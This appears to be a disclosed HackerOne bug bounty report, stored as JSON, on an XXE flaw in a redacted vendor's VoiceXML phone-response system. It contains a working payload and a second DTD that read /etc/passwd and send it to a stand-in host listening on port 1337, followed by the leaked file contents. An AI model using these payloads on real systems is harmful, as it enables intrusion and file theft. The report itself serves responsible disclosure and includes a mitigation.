{"id":395296,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTUyOTY=","url":"https://hackerone.com/reports/395296","title":"Phone Call to XXE via Interactive Voice Response","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-06-15T00:52:05.000Z","submitted_at":"2017-06-15T00:52:05.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cdl","url":"/cdl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":31807,"url":"https://hackerone.com/redact","handle":"redact","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"profile":{"name":"██████","twitter_handle":"","website":"","about":"██████ "}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-15T01:35:10.399Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"| Summary | \n|--|\n\n\u003e ████ is vulnerable to XXE due to the processing of DTDs\n\n| Description |\n|--|\n\u003e *\"VoiceXML (VXML) is a digital document standard for specifying interactive media and voice dialogs between humans and computers. It is used for developing audio and voice response applications\"*\n\n\u003e When a user purchases a phone number through █████,  they are given an option to forward inbound calls to an Interactive Voice Response (IVR) script (containing VoiceXML\". \n\n\u003e An attacker can create a VoiceXML file containing DTD's and the IVR system will process the entities.\n\n| Reproduction Steps |\n| -- |\n\n1.) Save the following files to your server in the web root:\n\n- _**payload.vxml**_:\n\n```\n\u003c?xml version='1.0' encoding='UTF-8' ?\u003e\n\u003c!DOCTYPE foo [\n\u003c!ENTITY % b SYSTEM \"file:///etc/passwd\"\u003e\n\u003c!ENTITY % asd SYSTEM \"http://example.com/lol.xml\"\u003e %asd; %rrr;]\u003e\n\u003cvxml version=\"2.1\"\u003e\n\u003cform\u003e\n\u003cblock\u003e\n\u003cprompt\u003epayload executed\u003c/prompt\u003e\n\u003c/block\u003e\n\u003c/form\u003e\n\u003c/vxml\u003e\n```\n\n- _**lol.xml**_:\n\n```\n\u003c!ENTITY % c \"\u003c!ENTITY \u0026#37; rrr SYSTEM 'http://example,com:1337/%b;'\u003e\"\u003e%c;\n```\n\n1.) Visit `https://dashboard.█████.com/your-numbers`\n2.) Click \"Edit\" on a phone number.\n3.) Go down to Voice and click \"Forward to VoiceXML\" and set the script URL to your malicious VXML file: (https://example.com/payload.vxml)\n4.)  Start a `netcat` listener and call that number:\n\nThe IVR system will process the entities and send you the contents of `/etc/passwd` on port 1337:\n\n```\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\ngopher:x:13:30:gopher:/var/gopher:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin\nabrt:x:173:173::/etc/abrt:/sbin/nologin\nhaldaemon:x:68:68:HAL daemon:/:/sbin/nologin\nntp:x:38:38::/etc/ntp:/sbin/nologin\nsaslauth:x:499:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologin\npostfix:x:89:89::/var/spool/postfix:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\napache:x:48:48:Apache:/var/www:/sbin/nologin\nnscd:x:28:28:NSCD Daemon:/:/sbin/nologin\nnslcd:x:65:55:LDAP Client User:/:/sbin/nologin\npuppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologin\nlogstash:x:498:499:logstash:/opt/logstash:/sbin/nologin\nnagios:x:497:498::/var/spool/nagios:/sbin/nologin\nnrpe:x:496:497:NRPE user for the NRPE service:/var/run/nrpe:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin\nunbound:x:495:496:Unbound DNS resolver:/etc/unbound:/sbin/nologin\nconsul:x:494:495:Hashicorp consul.io:/opt/consul:/bin/false \n```\n\n| Proof-of-Concept Video: |\n|--|\nHere is a proof-of-concept of me getting `/etc/issue`:  https://youtu.be/RbIB50R6IQA\n\n| Mitigation: |\n|--|\nThe suggested mitigation was to disable entities or move from Voice XML to JSON for their Text-to-Speech API's.\n\n\n|Outro:|\n|--|\nThis is probably the most fun bug I've found thus far, I had fun finding it - I hope you had fun reading about it!\n\nThanks,\nCorben Leo","vulnerability_information_html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eSummary\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e████ is vulnerable to XXE due to the processing of DTDs\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eDescription\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003cem\u003e\u0026quot;VoiceXML (VXML) is a digital document standard for specifying interactive media and voice dialogs between humans and computers. It is used for developing audio and voice response applications\u0026quot;\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eWhen a user purchases a phone number through █████,  they are given an option to forward inbound calls to an Interactive Voice Response (IVR) script (containing VoiceXML\u0026quot;. \u003c/p\u003e\n\n\u003cp\u003eAn attacker can create a VoiceXML file containing DTD\u0026#39;s and the IVR system will process the entities.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eReproduction Steps\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cp\u003e1.) Save the following files to your server in the web root:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cu\u003e\u003cstrong\u003epayload.vxml\u003c/strong\u003e\u003c/u\u003e:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;UTF-8\u0026#39; ?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE foo [\n\u0026lt;!ENTITY % b SYSTEM \u0026quot;file:///etc/passwd\u0026quot;\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY % asd SYSTEM \u0026quot;http://example.com/lol.xml\u0026quot;\u0026gt;\u003c/span\u003e %asd; %rrr;]\u0026gt;\n\u003cspan class=\"nt\"\u003e\u0026lt;vxml\u003c/span\u003e \u003cspan class=\"na\"\u003eversion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2.1\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;block\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;prompt\u0026gt;\u003c/span\u003epayload executed\u003cspan class=\"nt\"\u003e\u0026lt;/prompt\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/block\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/vxml\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cu\u003e\u003cstrong\u003elol.xml\u003c/strong\u003e\u003c/u\u003e:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;!ENTITY % c \u0026quot;\u0026lt;!ENTITY \u0026amp;#37; rrr SYSTEM \u0026#39;http://example,com:1337/%b;\u0026#39;\u0026gt;\u0026quot;\u0026gt;%c;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e1.) Visit \u003ccode\u003ehttps://dashboard.█████.com/your-numbers\u003c/code\u003e\u003cbr\u003e\n2.) Click \u0026quot;Edit\u0026quot; on a phone number.\u003cbr\u003e\n3.) Go down to Voice and click \u0026quot;Forward to VoiceXML\u0026quot; and set the script URL to your malicious VXML file: (\u003ca title=\"https://example.com/payload.vxml\" href=\"/redirect?url=https%3A%2F%2Fexample.com%2Fpayload.vxml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://example.com/payload.vxml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003cbr\u003e\n4.)  Start a \u003ccode\u003enetcat\u003c/code\u003e listener and call that number:\u003c/p\u003e\n\n\u003cp\u003eThe IVR system will process the entities and send you the contents of \u003ccode\u003e/etc/passwd\u003c/code\u003e on port 1337:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\ngopher:x:13:30:gopher:/var/gopher:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin\nabrt:x:173:173::/etc/abrt:/sbin/nologin\nhaldaemon:x:68:68:HAL daemon:/:/sbin/nologin\nntp:x:38:38::/etc/ntp:/sbin/nologin\nsaslauth:x:499:76:\u0026quot;Saslauthd user\u0026quot;:/var/empty/saslauth:/sbin/nologin\npostfix:x:89:89::/var/spool/postfix:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\napache:x:48:48:Apache:/var/www:/sbin/nologin\nnscd:x:28:28:NSCD Daemon:/:/sbin/nologin\nnslcd:x:65:55:LDAP Client User:/:/sbin/nologin\npuppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologin\nlogstash:x:498:499:logstash:/opt/logstash:/sbin/nologin\nnagios:x:497:498::/var/spool/nagios:/sbin/nologin\nnrpe:x:496:497:NRPE user for the NRPE service:/var/run/nrpe:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin\nunbound:x:495:496:Unbound DNS resolver:/etc/unbound:/sbin/nologin\nconsul:x:494:495:Hashicorp consul.io:/opt/consul:/bin/false \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eProof-of-Concept Video:\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cp\u003eHere is a proof-of-concept of me getting \u003ccode\u003e/etc/issue\u003c/code\u003e:  \u003ca title=\"https://youtu.be/RbIB50R6IQA\" href=\"/redirect?url=https%3A%2F%2Fyoutu.be%2FRbIB50R6IQA\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://youtu.be/RbIB50R6IQA\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eMitigation:\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cp\u003eThe suggested mitigation was to disable entities or move from Voice XML to JSON for their Text-to-Speech API\u0026#39;s.\u003c/p\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eOutro:\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cp\u003eThis is probably the most fun bug I\u0026#39;ve found thus far, I had fun finding it - I hope you had fun reading about it!\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nCorben Leo\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":159,"voters":["barbie_girl","jokebookservice1","rhynorater","lpi","jr0ch17","pomme","cdl","kapytein","jobert","michiel","and 149 more..."],"severity":{"rating":"critical","score":9.9,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"low","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3197007,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-21T00:52:05.000Z","updated_at":"2018-06-21T00:52:05.000Z","actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"cdl","url":"/cdl"},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3197008,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-15T01:35:10.422Z","updated_at":"2018-08-15T01:35:10.422Z","actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3197009,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-15T01:35:31.463Z","updated_at":"2018-08-15T01:35:31.463Z","additional_data":{"old_severity":null,"new_severity":"Critical (9.9)","old_severity_id":null,"new_severity_id":196831},"actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"redact","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}